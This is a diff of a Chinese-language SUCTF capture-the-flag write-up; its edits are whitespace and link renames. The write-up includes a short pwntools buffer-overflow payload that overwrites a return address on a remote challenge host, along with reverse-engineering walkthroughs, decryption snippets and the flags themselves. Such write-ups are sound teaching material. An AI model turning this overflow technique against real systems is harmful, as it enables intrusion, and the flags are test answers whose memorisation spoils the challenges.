@@ -29,7 +29,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   read(0, &v4, 0x100u);
   return 0;
 }
-
+ 
 //----- (0804865D) --------------------------------------------------------
 int getflag()
 {
@@ -55,8 +55,8 @@ int getflag()
 可以看出这个题需要覆盖返回地址，使主函数的返回地址变为 0x0804865D, 跳至 `getflag` 函数, 然后输入 "zhimakaimen" 得到 flag. 编写 payload：
 ```python
 from pwn import *
-
-
+ 
+ 
 r = remote('xxx.xxx.xxx.xxx', 10000)
 r.send('A' * 112 + '\x5d\x86\x04\x08')
 r.interactive()
@@ -107,11 +107,11 @@ else
 # Mobile
 
 ## 最基础的安卓逆向题
-文件在[这儿](/suctf/SimpleAndroid.apk)。  
+文件在[这儿](/suctf/SimpleAndroid_apk)。  
 先用 `dex2jar` 解出 jar 包，然后用 `jd-gui` 反编译，最后发现 flag 在 `MainActivity` 里：`suctf{Crack_Andr01d+50-3asy}`
 
 ## Mob200
-[文件](/suctf/CrackMe.apk)。  
+[文件](/suctf/CrackMe_apk)。  
 反编译以后改代码，把加密过程逆过来，放到安卓系统里跑一下就能出结果。  
 然而 Android Studio 跟我有仇… 工程跑不起来，算了。
 
@@ -122,9 +122,9 @@ else
 #include <stdint.h>
 #include <stdio.h>
 #include <string.h>
-
+ 
 char * g1 = "\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a"; // 0x410aa0
-
+ 
 int main(int argc, char ** argv) {
     int32_t str = 0; // bp-52
     int32_t str2 = 0; // bp-32
@@ -165,7 +165,7 @@ int main(int argc, char ** argv) {
 编写解密程序：  
 ```C
 char g[] = "\x58\x31\x70\x5c\x35\x76\x59\x69\x38\x7d\x55\x63\x38\x7f\x6a";
-
+ 
 int main() {
     for (int i = 0; i < strlen(g); i++) {
         printf("%c", g[i] ^ i);
@@ -292,11 +292,11 @@ codecs.encode('fhpgs{CP9PuHsGx#}', 'rot13')
 
 ```
 $ binwalk xu.jpg
-
+ 
 DECIMAL         HEX             DESCRIPTION
 -------------------------------------------------------------------------------------------------------
 46046           0xB3DE          RAR archive data
-
+ 
 $ dd if=xu.jpg of=xu.rar bs=1 skip=46046
 20221+0 records in
 20221+0 records out
@@ -324,7 +324,7 @@ ff 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
 # Re
 
 ## 先利其器
-下载一个[文件](/suctf/use_of_ida.exe)。  
+下载一个[文件](/suctf/use_of_ida_exe)。  
 拖进 IDA，找到两段代码：
 
 ```C
@@ -334,7 +334,7 @@ if ( num > 9 ) {
     flag(&plaintext);
 }
 // ...
-
+ 
 signed int __cdecl flag(int *ret) {
     ret[12] = 'a';
     ret[11] = '6';
@@ -354,7 +354,7 @@ signed int __cdecl flag(int *ret) {
 然后拼起来，flag 里还差个下划线，没看代码，猜出来了：`suctf{I_c@n_U5e_I6a}`
 
 ## PE_Format
-[文件](/suctf/Do_you_know_pe.exe)。  
+[文件](/suctf/Do_you_know_pe_exe)。  
 不懂 PE 格式，下下来以后看了半天。后来发现出题人竟然把 MZ 头和 PE 头里的 `MZ` 和 `PE` 给调过来了:joy: 改正后，把 MZ 头中 PE 头的位置从 0x40 改到 0x80, 程序就能跑起来了。
 
 拖到 IDA 里反编译，程序竟然是用 C艹 写的…啃代码啃代码，最后发现 flag 被按位非了，写个程序解出来：
@@ -362,18 +362,18 @@ signed int __cdecl flag(int *ret) {
 ```C
 #include <stdio.h>
 #include <string.h>
-
+ 
 // char secret[] = "» ¦Š ”‘ˆ ¯º ¹’ž‹À";
 char secret[] = "\xBB\x90\xA0\xA6\x90\x8A\xA0\x94\x91\x90\x88\xA0\xAF\xBA\xA0\xB9\x90\x8D\x92\x9E\x8B\xC0";
 char v35[40];
-
+ 
 int main()
 {
     char c;
     int len = strlen(secret);
     memset(v35, 0, 30);
     strcpy(v35, secret);
-
+ 
     for (int i = 0; i < len; i++)
         v35[i] = ~v35[i];
     printf("%s\n", v35);
@@ -394,7 +394,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
   char v5; // [sp+20h] [bp-18h]@1
   int v6; // [sp+28h] [bp-10h]@11
   int v7; // [sp+2Ch] [bp-Ch]@1
-
+ 
   v7 = 0;
   memset(&s, 0, 0x14u);
   __isoc99_scanf((const char *)&unk_8048D40, &v5);
@@ -434,7 +434,7 @@ int __cdecl main(int argc, const char **argv, const char **envp)
 看小伙伴的 Writeup 时，发现 IDA 反编译出的源码是可以在 Linux 中编译的，他直接把源码里的 v5 改成 v7，然后编译一下就出来了。神奇:flushed:
 
 ## reverse04
-[文件](/suctf/reverse03.exe)。尼玛，为啥题目是 04，文件是 03…
+[文件](/suctf/reverse03_exe)。尼玛，为啥题目是 04，文件是 03…
 
 程序里用了各种反动态调试技术，于是我就静态分析了，反正也不会。结果分析了半天，各种算地址，最后算出来的 flag 都有问题，就放弃了…  
 据说我只跟 flag 差一个凯撒加密？噫，那天状态真是差。flag: `suctf{antidebugabc}`.
